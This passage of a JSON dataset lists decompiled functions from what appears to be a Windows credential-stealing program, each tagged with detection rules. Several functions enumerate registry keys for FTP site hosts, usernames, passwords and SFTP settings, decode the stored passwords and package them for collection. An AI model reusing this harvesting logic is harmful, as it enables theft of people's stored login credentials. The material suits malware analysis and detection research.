        "decompiled_code": "\nvoid __cdecl fcn.0040aaa8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x2f, 0);\n    if (*0x414b5b != NULL) {\n        var_8h = NULL;\n        iVar1 = (**0x414b5b)(&var_8h, 0, 0, 0);\n        if ((-1 < iVar1) && (var_8h != NULL)) {\n            fcn.0040a45e(arg_8h, var_8h, fcn.0040a557);\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    fcn.0040a875(arg_8h);\n    fcn.0040a96d(arg_8h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 232
    },
    "0040ab24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ab24(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    uchar *puVar7;\n    uint16_t *puVar8;\n    uint32_t var_10h;\n    uchar *var_ch;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    *arg_ch = 0;\n    uVar3 = fcn.0041066a(arg_8h);\n    if (uVar3 < 2) {\n        return 0;\n    }\n    uVar4 = uVar3 >> 1;\n    *arg_ch = uVar4;\n    puVar6 = arg_8h;\n    puVar8 = arg_8h;\n    if ((uVar3 & 1) == 0) {\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            uVar2 = *puVar6;\n            uVar1 = uVar2 >> 8;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    return 0;\n                }\n                uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n            }\n            else {\n                uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n            }\n            uVar1 = uVar2;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    return 0;\n                }\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n            }\n            else {\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n            }\n            *puVar8 = uVar2 << 4 | uVar2 >> 8;\n            puVar6 = puVar6 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        var_8h = *arg_ch;\n        var_4h = arg_8h;\n        var_ch = NULL;\n        if ((((*0x414b43 != NULL) && (iVar5 = (**0x414b43)(&var_8h, 0, 0, 0, 0, 1, &var_10h),  iVar5 != 0)) &&\n            (var_ch != NULL)) && (var_10h < *arg_ch || var_10h == *arg_ch)) {\n            uVar3 = var_10h;\n            puVar7 = var_ch;\n            if (var_10h != 0) {\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *arg_8h = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    arg_8h = arg_8h + 1;\n                }\n            }\n            *arg_ch = var_10h;\n            fcn.0041067c(var_ch);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 785
    },
    "0040ac3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac3e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint *var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004018cf(0x2000);\n    var_8h = fcn.004018cf(0x2000);\n    var_ch = fcn.004018cf(0x2000);\n    var_10h = fcn.004018cf(0x2000);\n    var_14h = fcn.004018cf(0x2000);\n    var_18h = fcn.004018cf(0x2000);\n    var_1ch = fcn.004018cf(0x2000);\n    fcn.004107ae(var_4h, \"SiteServer %d\\\\Host\", arg_10h);\n    fcn.004107ae(var_8h, \"SiteServer %d\\\\WebUrl\", arg_10h);\n    fcn.004107ae(var_ch, \"SiteServer %d\\\\Remote Directory\", arg_10h);\n    fcn.004107ae(var_10h, \"SiteServer %d-User\", arg_10h);\n    fcn.004107ae(var_14h, \"SiteServer %d-User PW\", arg_10h);\n    fcn.004107ae(var_18h, \"%s\\\\Keychain\", arg_ch);\n    fcn.004107ae(var_1ch, \"SiteServer %d\\\\SFTP\", arg_10h);\n    var_20h = fcn.00401d71(*0x414869, arg_ch, var_4h, 0);\n    var_24h = fcn.00401d71(*0x414869, arg_ch, var_8h, 0);\n    var_28h = fcn.00401d71(*0x414869, arg_ch, var_ch, 0);\n    var_2ch = fcn.00401d71(*0x414869, var_18h, var_10h, 0);\n    var_30h = fcn.00401d71(*0x414869, var_18h, var_14h, 0);\n    var_34h = fcn.00401d71(*0x414869, arg_ch, var_1ch, &var_40h);\n    if (((var_20h != 0) && (var_2ch != 0)) && (var_30h != 0)) {\n        iVar1 = fcn.0040ab24(var_2ch, &var_3ch);\n        if ((iVar1 != 0) && (var_3ch != 0)) {\n            iVar1 = fcn.0040ab24(var_30h, &var_38h);\n            if ((iVar1 != 0) && (var_38h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0010);\n                fcn.004015cb(arg_8h, var_20h);\n                fcn.004015cb(arg_8h, var_24h);\n                fcn.004015cb(arg_8h, var_28h);\n                fcn.0040159f(arg_8h, var_2ch, var_3ch);\n                fcn.0040159f(arg_8h, var_30h, var_38h);\n                if ((var_34h == NULL) || (var_40h != 4)) {\n                    fcn.00401569(arg_8h, 0);\n                }\n                else {\n                    fcn.00401569(arg_8h, *var_34h);\n                }\n            }\n        }\n    }\n    fcn.004018b8(var_4h);\n    fcn.004018b8(var_8h);\n    fcn.004018b8(var_ch);\n    fcn.004018b8(var_10h);\n    fcn.004018b8(var_14h);\n    fcn.004018b8(var_18h);\n    fcn.004018b8(var_1ch);\n    fcn.004018b8(var_20h);\n    fcn.004018b8(var_24h);\n    fcn.004018b8(var_28h);\n    fcn.004018b8(var_2ch);\n    fcn.004018b8(var_30h);\n    fcn.004018b8(var_34h);\n    return;\n}\n",
        "token_count": 1112
    },
    "0040aed7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aed7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_818h;\n    uint32_t *var_814h;\n    uint var_810h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_810h, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_00 = fcn.00401df8(arg_8h_00, &var_810h);\n            fcn.004018b8(arg_8h_00);\n            var_814h = fcn.00401d71(*0x414869, arg_ch_00, \"SiteServers\", &var_10h);\n            if (var_814h != NULL) {\n                if (var_10h == 4) {\n                    var_814h = *var_814h;\n                    if (1000 < var_814h) {\n                        var_814h = 0x3e8;\n                    }\n                    while (var_814h != NULL) {\n                        var_814h = var_814h - 1;\n                        fcn.0040ac3e(arg_8h, arg_ch_00, var_814h);\n                    }\n                }\n                fcn.004018b8(var_814h);\n            }\n            fcn.004018b8(var_814h);\n            fcn.0040aed7(arg_8h, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 522
    },
    "0040b043": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b043(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x31, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, 0x416489, 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 444
    },
    "0040b0c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nulong __cdecl fcn.0040b0c1(uint arg_8h, int32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (*arg_ch == 0) {\n        return 0;\n    }\n    uVar2 = 1;\n    do {\n        if (9 < uVar2) {\ncode_r0x0040b154:\n            if (*arg_ch == 0) {\n                var_8h = 0;\n                var_4h = 0;\n            }\n            return CONCAT44(var_4h, var_8h);\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = uVar2;\n        }\n        uVar1 = fcn.004013bd(arg_8h, arg_ch);\n        if (uVar2 == 9) {\n            var_8h = var_8h | uVar1;\n            goto code_r0x0040b154;\n        }\n        var_8h = var_8h | uVar1 & 0xffffff7f;\n        if ((uVar1 & 0x80) == 0) goto code_r0x0040b154;\n        if (uVar2 == 8) {\n            var_4h = var_4h << 8 | var_8h >> 0x18;\n            var_8h = var_8h << 8;\n        }\n        else {\n            var_4h = var_4h << 7 | var_8h >> 0x19;\n            var_8h = var_8h << 7;\n        }\n        uVar2 = uVar2 + 1;\n    } while( true );\n}\n",
        "token_count": 440
    },
    "0040b16d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b16d(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    int64_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arg_10h_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x418e94 < arg_ch) {\n        return 0;\n    }\n    arg_ch_00 = fcn.004018cf(*0x418e94);\n    fcn.00401000(&var_4h);\n    iVar2 = fcn.0040133e(arg_8h, arg_ch_00, arg_ch, arg_14h);\n    if (iVar2 != 0) {\n        fcn.0040118c(var_4h, arg_ch_00, arg_ch);\n        if (arg_10h <= arg_ch) goto code_r0x0040b271;\n        var_ch = fcn.00401364(arg_8h, arg_14h);\n        while( true ) {\n            if (var_ch == 0) goto code_r0x0040b271;\n            iVar1 = (var_ch - 1) * *0x418e94;\n            if (iVar1 >> 0x20 != 0) break;\n            fcn.00401047(arg_8h, iVar1, 0);\n            var_ch = fcn.00401364(arg_8h, arg_14h);\n            if ((*arg_14h == 0) ||\n               (arg_10h_00 = arg_8h,  iVar2 = fcn.0040133e(arg_8h, arg_ch_00, *0x418e94 - 4, arg_14h),  iVar2 == 0))\n            break;\n            fcn.0040118c(var_4h, arg_ch_00, arg_10h_00);\n            uVar3 = fcn.00401082();\n            if (0x6400000 < uVar3) break;\n        }\n    }\n    fcn.00401021(var_4h);\n    var_4h = 0;\n    *arg_14h = 0;\ncode_r0x0040b271:\n    fcn.004018b8(arg_ch_00);\n    return var_4h;\n}\n",
        "token_count": 542
    },
    "0040b280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b280(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t **arg_14h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004018cf(arg_ch + 8);\n    *piVar1 = arg_ch;\n    piVar1[1] = arg_10h;\n    if (arg_ch != 0) {\n        fcn.00401906(arg_8h, piVar1 + 2, arg_ch);\n    }\n    *arg_14h = piVar1;\n    return 1;\n}\n",
        "token_count": 141
    },
    "0040b2c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b2c1(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    bVar3 = (arg_ch & 1) == 0;\n    if (arg_ch == 0) {\n        uVar2 = fcn.0040b280(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 1) {\n        var_4h = fcn.004013bd(arg_8h, arg_10h);\n        uVar2 = fcn.0040b280(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 2) {\n        var_4h = fcn.00401390(arg_8h, arg_10h);\n        uVar2 = fcn.0040b280(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 3) {\n        fcn.004013e8(arg_8h, 3, arg_10h);\n        uVar2 = fcn.0040b280(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 4) {\n        var_4h = fcn.00401364(arg_8h, arg_10h);\n        uVar2 = fcn.0040b280(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 5) {\n        fcn.004013e8(arg_8h, 6, arg_10h);\n        uVar2 = 1;\n    }\n    else if (arg_ch == 6) {\n        fcn.004013e8(arg_8h, 8, arg_10h);\n        uVar2 = fcn.0040b280(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 7) {\n        fcn.004013e8(arg_8h, 8, arg_10h);\n        uVar2 = fcn.0040b280(0, 0, 3, arg_14h);\n    }\n    else if (arg_ch == 8) {\n        var_4h = 0;\n        uVar2 = fcn.0040b280(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 9) {\n        var_4h = 1;\n        uVar2 = fcn.0040b280(&var_4h, 4, 0, arg_14h);\n    }\n    else if (arg_ch == 10) {\n        uVar2 = 0;\n    }\n    else if (arg_ch == 0xb) {\n        uVar2 = 0;\n    }\n    else if (((arg_ch < 0xc) || (!bVar3)) || (0x63fffff < arg_ch)) {\n        if (((arg_ch < 0xd) || (bVar3)) || (0x63fffff < arg_ch)) {\n            uVar2 = 0;\n        }\n        else {\n            uVar1 = arg_ch - 0xd >> 1;\n            uVar2 = fcn.004018cf(uVar1);\n            fcn.0040133e(arg_8h, uVar2, uVar1, arg_10h);\n            fcn.0040b280(uVar2, uVar1, 1, arg_14h);\n            fcn.004018b8(uVar2);\n            uVar2 = 1;\n        }\n    }\n    else {\n        uVar1 = arg_ch - 0xc >> 1;\n        uVar2 = fcn.004018cf(uVar1);\n        fcn.0040133e(arg_8h, uVar2, uVar1, arg_10h);\n        fcn.0040b280(uVar2, uVar1, 2, arg_14h);\n        fcn.004018b8(uVar2);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 988
    },
    "0040b522": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b522(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = arg_8h;\n    if (arg_8h != NULL) {\n        for (; *piVar1 != 0; piVar1 = piVar1 + 1) {\n            fcn.004018b8(*piVar1);\n        }\n        fcn.004018b8(arg_8h);\n        return;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0040b552": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b552(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h, int32_t *arg_18h)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(arg_8h + arg_ch * 4);\n    if (arg_10h != NULL) {\n        *arg_10h = *puVar1;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = puVar1[1];\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = puVar1;\n        *arg_18h = *arg_18h + 8;\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "0040b58c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b58c(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    ulong uVar4;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    *arg_10h = 0;\n    *arg_ch = NULL;\n    if (arg_8h == 0) {\n        return 0;\n    }\n    var_8h = fcn.00401082(arg_8h);\n    if (var_8h != 0) {\n        fcn.004012bb(arg_8h);\n        var_ch = 1;\n        uVar4 = fcn.0040b0c1(arg_8h, &var_ch, &var_14h);\n        if (((uVar4 < var_14h) || (var_ch == 0)) || (uVar4 >> 0x20 != 0)) {\n            return 0;\n        }\n        var_18h = uVar4 - var_14h;\n        if (0xa00000 < var_18h) {\n            return 0;\n        }\n        var_4h = fcn.004018cf(var_18h * 4);\n        var_1ch = 0;\n        puVar2 = var_4h;\n        while ((var_18h != 0 && (var_ch != 0))) {\n            uVar4 = fcn.0040b0c1(arg_8h, &var_ch, &var_10h);\n            if ((var_18h < var_10h) || (uVar4 >> 0x20 != 0)) {\n                fcn.004018b8(var_4h);\n                return 0;\n            }\n            var_18h = var_18h - var_10h;\n            var_1ch = var_1ch + 1;\n            *puVar2 = uVar4;\n            puVar2 = puVar2 + 1;\n        }\n        if ((var_18h != 0) || (var_ch == 0)) {\n            fcn.004018b8(var_4h);\n            return 0;\n        }\n        if (var_1ch != 0) {\n            *arg_10h = var_1ch;\n            arg_8h_00 = fcn.004018cf(var_1ch << 2);\n            puVar2 = var_4h;\n            piVar3 = arg_8h_00;\n            while ((var_1ch != 0 && (var_ch != 0))) {\n                var_20h = 0;\n                iVar1 = fcn.0040b2c1(arg_8h, *puVar2, &var_ch, &var_20h);\n                if ((iVar1 == 0) || ((var_ch == 0 || (var_20h == 0)))) {\n                    if (var_20h != 0) {\n                        fcn.004018b8(var_20h);\n                    }\n                    fcn.0040b522(arg_8h_00);\n                    fcn.004018b8(var_4h);\n                    return 0;\n                }\n                *piVar3 = var_20h;\n                var_1ch = var_1ch + -1;\n                puVar2 = puVar2 + 1;\n                piVar3 = piVar3 + 1;\n            }\n            *arg_ch = arg_8h_00;\n        }\n        fcn.004018b8(var_4h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 884
    },
    "0040b736": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b736(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, code *arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t arg_ch_00;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        return 1;\n    }\n    var_10h = (arg_10h + -1) * *0x418e94;\n    fcn.00401047(arg_8h, var_10h, 0);\n    if (arg_10h + -1 == 0) {\n        fcn.00401047(arg_8h, 100, 1);\n    }\n    var_4h = fcn.004013bd(arg_8h, arg_14h);\n    fcn.00401390(arg_8h, arg_14h);\n    var_8h = fcn.00401390(arg_8h, arg_14h);\n    fcn.00401390(arg_8h, arg_14h);\n    fcn.004013bd(arg_8h, arg_14h);\n    if ((*arg_14h == 0) || ((var_4h != 0xd && (var_4h != 5)))) {\n        return 0;\n    }\n    if (*0x418e94 >> 1 < var_8h) {\n        return 0;\n    }\n    if (var_4h == 5) {\n        var_38h = fcn.00401364(arg_8h, arg_14h);\n    }\n    var_ch = fcn.004018cf(0x10000);\n    for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n        uVar1 = fcn.00401390(arg_8h, arg_14h);\n        *(var_ch + uVar3 * 4) = uVar1;\n    }\n    if (*arg_14h == 0) {\n        fcn.004018b8(var_ch);\n        return 0;\n    }\n    if (var_4h == 5) {\n        for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n            fcn.00401047(arg_8h, *(var_ch + uVar3 * 4) + var_10h, 0);\n            uVar1 = fcn.00401364(arg_8h, arg_14h);\n            fcn.0040b0c1(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.004018b8(var_ch);\n                return 0;\n            }\n            iVar2 = fcn.0040b736(arg_8h, arg_ch, uVar1, arg_14h, arg_18h);\n            if (iVar2 == 0) {\n                fcn.004018b8(var_ch);\n                return 0;\n            }\n        }\n        iVar2 = fcn.0040b736(arg_8h, arg_ch, var_38h, arg_14h, arg_18h);\n        if (iVar2 == 0) {\n            fcn.004018b8(var_ch);\n            return 0;\n        }\n    }\n    else if (var_4h == 0xd) {\n        for (uVar3 = 0; uVar3 < var_8h; uVar3 = uVar3 + 1) {\n            fcn.00401047(arg_8h, *(var_ch + uVar3 * 4) + var_10h, 0);\n            uVar4 = fcn.0040b0c1(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.004018b8(var_ch);\n                return 0;\n            }\n            if (uVar4 >> 0x20 != 0) break;\n            var_14h = uVar4;\n            fcn.0040b0c1(arg_8h, arg_14h, 0);\n            if (*arg_14h == 0) {\n                fcn.004018b8(var_ch);\n                return 0;\n            }\n            var_20h = ((*0x418e94 - 0xc) * 0x20) / 0xff - 0x17;\n            var_18h = *0x418e94 - 0x23;\n            arg_ch_00 = var_14h;\n            if ((var_18h < var_14h) &&\n               (var_1ch = (var_14h - var_20h) % (*0x418e94 - 4) + var_20h,  arg_ch_00 = var_1ch,  var_18h < var_1ch)) {\n                arg_ch_00 = var_20h;\n            }\n            iVar2 = fcn.0040b16d(arg_8h, arg_ch_00, var_14h, arg_14h);\n            if (iVar2 == 0) {\n                fcn.004018b8(var_ch);\n                return 0;\n            }\n            var_24h = iVar2;\n            iVar2 = fcn.0040b58c(iVar2, &var_28h, &var_2ch);\n            fcn.00401021(var_24h);\n            if ((iVar2 != 0) && (var_28h != 0)) {\n                (*arg_18h)(arg_8h, arg_ch, var_28h, var_2ch);\n                fcn.0040b522(var_28h);\n            }\n        }\n    }\n    fcn.004018b8(var_ch);\n    return 1;\n}\n",
        "token_count": 1435
    },
    "0040baf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040baf7(char *arg_8h)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = fcn.00410808(arg_8h, 0x4164bd);\n    pcVar5 = arg_8h;\n    if (pcVar3 == NULL) {\n        return;\n    }\n    while (pcVar3 = pcVar3 + 1,  *pcVar3 != '\\0') {\n        *pcVar5 = *pcVar3;\n        pcVar5 = pcVar5 + 1;\n    }\n    *pcVar5 = *pcVar3;\n    iVar4 = fcn.00410808(arg_8h, 0x4164bf);\n    pcVar3 = arg_8h;\n    if (iVar4 != 0) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (((((*pcVar3 == '\\t') || (*pcVar3 == '\\r')) || (*pcVar3 == '\\n')) ||\n                ((*pcVar3 == '[' || (*pcVar3 == ']')))) || (*pcVar3 == '`')) {\n                *pcVar3 = ' ';\n            }\n        }\n        bVar1 = false;\n        uVar2 = 0;\n        for (pcVar3 = arg_8h; pcVar5 = arg_8h,  *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (*pcVar3 == '\\'') {\n                if (bVar1) {\n                    if (!(uVar2 & 1)) {\n                        *pcVar3 = ' ';\n                        bVar1 = false;\n                    }\n                }\n                else if (!(uVar2 & 1)) {\n                    bVar1 = true;\n                }\n            }\n            if (*pcVar3 == '\\\\') {\n                uVar2 = uVar2 + 1;\n            }\n            else {\n                uVar2 = 0;\n            }\n            if (bVar1) {\n                *pcVar3 = ' ';\n            }\n        }\n        for (; *pcVar5 != '\\0'; pcVar5 = pcVar5 + 1) {\n            if ((*pcVar5 == ' ') && (pcVar3 = pcVar5,  pcVar5[1] == ' ')) {\n                for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n                    *pcVar3 = pcVar3[1];\n                }\n                pcVar5 = pcVar5 + -1;\n            }\n        }\n        var_ch = 0;\n        pcVar3 = arg_8h;\n        do {\n            if (*pcVar3 == '\\0') {\n                fcn.0040ba3c(arg_8h, var_ch);\n                return;\n            }\n            if (*pcVar3 == ',') {\n                *pcVar3 = '\\0';\n                iVar4 = fcn.0040ba3c(arg_8h, var_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                arg_8h = pcVar3 + 1;\n                var_ch = var_ch + 1;\n            }\n            pcVar3 = pcVar3 + 1;\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 765
    },
    "0040bc36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
